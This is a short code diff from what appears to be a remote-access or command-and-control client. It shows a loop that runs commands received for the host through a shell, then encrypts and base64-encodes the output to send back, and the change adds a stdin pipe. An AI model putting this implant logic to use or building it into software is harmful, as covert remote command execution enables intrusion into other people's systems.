@@ -158,7 +158,7 @@ while 1:
             if hostname in parse:
                 parse = parse.split(hostname + "::::")[1]
                 # execute our parsed command
-                proc = subprocess.Popen(parse, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                proc = subprocess.Popen(parse, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 stdout_value = proc.communicate()[0]
                 stdout_value = cipher.encrypt(hostname + "::::" + stdout_value.decode('utf-8')).encode('utf-8')
                 stdout_value = base64.b64encode(stdout_value).decode('utf-8')
